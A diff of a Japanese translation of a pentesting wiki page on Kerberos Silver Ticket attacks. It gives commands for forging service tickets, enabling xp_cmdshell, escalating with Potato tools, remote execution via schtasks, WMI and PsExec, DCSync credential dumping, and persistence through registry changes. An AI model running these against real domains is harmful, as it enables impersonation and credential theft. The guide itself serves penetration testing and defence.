@@ -6,15 +6,15 @@
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+**Silver Ticket** 攻撃は、Active Directory (AD) 環境におけるサービスチケットの悪用を伴います。この手法は、コンピュータアカウントのようなサービスアカウントの**NTLMハッシュを取得する**ことに依存し、そのハッシュを使って Ticket Granting Service (TGS) チケットを偽造します。偽造したチケットにより、攻撃者はネットワーク上の特定サービスにアクセスし、通常は管理権限を狙って**任意のユーザーになりすます**ことができます。チケットを偽造する際に AES キーを使う方がより安全で検出されにくいことが強調されます。
 
 > [!WARNING]
-> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
-Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.
+> Silver Tickets は Golden Tickets より検出されにくいです。なぜなら要求されるのは krbtgt アカウントではなくサービスアカウントの**ハッシュ**だけだからです。ただし、対象となるサービスに限定されます。さらに、ユーザーのパスワードを単に盗むだけで可能です。
+> また、SPN を持つ**アカウントのパスワード**を奪取した場合、そのパスワードを使ってそのサービスに対して任意のユーザーを偽装する Silver Ticket を作成できます。
 
 For ticket crafting, different tools are employed based on the operating system:
 
-### On Linux
+### Linux上
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -37,11 +37,11 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-CIFS service は標的のファイルシステムへアクセスする一般的なターゲットとしてよく挙げられますが、HOST や RPCSS といった他のサービスもタスクや WMI クエリの実行に悪用可能です。
+The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
 
-### 例：MSSQL service (MSSQLSvc) + Potato to SYSTEM
+### 例: MSSQL service (MSSQLSvc) + Potato to SYSTEM
 
-SQL サービスアカウント（例: sqlsvc）の NTLM ハッシュ（または AES キー）を入手している場合、MSSQL SPN に対する TGS を偽造して SQL service に対して任意のユーザーを偽装できます。そこから xp_cmdshell を有効化して SQL サービスアカウントとしてコマンドを実行します。その token に SeImpersonatePrivilege が含まれていれば、Potato をチェーンして SYSTEM に昇格できます。
+もしSQLサービスアカウント（例: sqlsvc）のNTLMハッシュ（またはAESキー）を持っていれば、MSSQLのSPNに対するTGSを偽造して、任意のユーザとしてSQLサービスに対してなりすますことができます。そこからxp_cmdshellを有効化して、SQLサービスアカウントとしてコマンドを実行します。そのトークンにSeImpersonatePrivilegeがあれば、PotatoをチェーンしてSYSTEMに昇格させます。
 ```bash
 # Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
 python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
@@ -52,30 +52,32 @@ export KRB5CCNAME=$PWD/administrator.ccache
 impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
 -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
 ```
-- 結果のコンテキストに SeImpersonatePrivilege がある場合（サービスアカウントではよくある）、SYSTEM を取得するために Potato のバリアントを使用する:
+- 結果のコンテキストが SeImpersonatePrivilege を持っている場合（サービスアカウントに当てはまることが多い）、Potato の亜種を使って SYSTEM を取得する:
 ```bash
 # On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
 PrintSpoofer.exe -c "cmd /c whoami"
 # or
 GodPotato -cmd "cmd /c whoami"
 ```
-More details on abusing MSSQL and enabling xp_cmdshell:
+MSSQL の悪用および xp_cmdshell の有効化の詳細:
+
 {{#ref}}
 abusing-ad-mssql.md
 {{#endref}}
 
-Potato techniques overview:
+Potato techniques の概要:
+
 {{#ref}}
 ../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
 {{#endref}}
 
 ## 利用可能なサービス
 
-| サービスの種類                               | Service Silver Tickets                                                     |
+| サービスの種類                             | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては単に要求するだけで済むことがあります: WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OSによっては以下も：</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>場合によっては単に要求できます: WINRM</p> |
 | Scheduled Tasks                            | HOST                                                                       |
 | Windows File Share, also psexec            | CIFS                                                                       |
 | LDAP operations, included DCSync           | LDAP                                                                       |
@@ -90,25 +92,25 @@ Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 - 4624: アカウント ログオン
 - 4634: アカウント ログオフ
-- 4672: 管理者ログオン
+- 4672: 管理者 ログオン
 
 ## 永続化
 
-マシンが30日ごとにパスワードをローテーションするのを回避するには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` を設定するか、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を30日より大きい値に設定して、マシンのパスワードをローテーションする期間を延長できます。
+マシンが 30 日ごとにパスワードをローテーションするのを避けるには、`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` を設定するか、`HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` を 30 日より大きな値に設定して、マシンのパスワードをいつローテーションするかを示すことができます。
 
 ## サービスチケットの悪用
 
-以下の例では、チケットが管理者アカウントを偽装して取得されたと仮定します。
+以下の例では、そのチケットが管理者アカウントを偽装して取得されたと仮定します。
 
 ### CIFS
 
-このチケットを使うと、`C$` や `ADMIN$` フォルダに **SMB** 経由でアクセスでき（公開されていれば）、リモートファイルシステムの一部にファイルをコピーできます。例えば次のように実行します:
+このチケットがあれば、`C$` と `ADMIN$` フォルダに **SMB** 経由でアクセスでき（公開されている場合）、次のようにしてリモートファイルシステムの一部にファイルをコピーできます：
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-また、**psexec** を使用してホスト内でシェルを取得したり、任意のコマンドを実行したりできます:
+さらに、**psexec** を使用してホスト内でシェルを取得したり、任意のコマンドを実行したりできます:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -116,7 +118,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 ### ホスト
 
-この権限があれば、リモートコンピュータ上にスケジュールされたタスクを作成し、任意のコマンドを実行できます：
+この権限があれば、リモートコンピュータにスケジュールされたタスクを作成して任意のコマンドを実行できます:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -130,7 +132,7 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
 ### HOST + RPCSS
 
-これらのチケットを使うと、**標的システムでWMIを実行できます**:
+これらのチケットを使用すると、**標的システム上でWMIを実行できます**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -140,20 +142,19 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-以下のページで **wmiexec に関する詳細** を確認してください:
-
+以下のページで**wmiexec**に関する詳細情報を確認してください：
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
 {{#endref}}
 
-### ホスト + WSMAN (WINRM)
+### HOST + WSMAN (WINRM)
 
-コンピュータに対する winrm アクセスがあれば、それに **access it** し、PowerShell を取得することさえできます:
+コンピュータに対して winrm アクセスがあると、そのコンピュータに**アクセス**したり、PowerShell を取得したりできます:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-次のページを確認して、**winrmを使用してリモートホストに接続する他の方法**を学んでください：
+次のページを参照して、**winrm を使用してリモートホストに接続する他の方法**を確認してください：
 
 
 {{#ref}}
@@ -161,15 +162,15 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 {{#endref}}
 
 > [!WARNING]
-> リモートコンピュータにアクセスするには、**winrmが有効でリッスンしている必要がある**ことに注意してください。
+> リモートコンピュータにアクセスするには、**winrm が有効でリッスンしている必要がある**ことに注意してください。
 
 ### LDAP
 
-この権限があれば、**DCSync**を使用してDCのデータベースをダンプすることができます：
+この特権があれば、**DCSync** を使用して DC のデータベースをダンプできます：
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**DCSync について詳しく学ぶには** 次のページを参照してください:
+**DCSync の詳細については次のページを参照してください**
 
 
 {{#ref}}
@@ -177,7 +178,7 @@ dcsync.md
 {{#endref}}
 
 
-## 参考資料
+## 参考
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
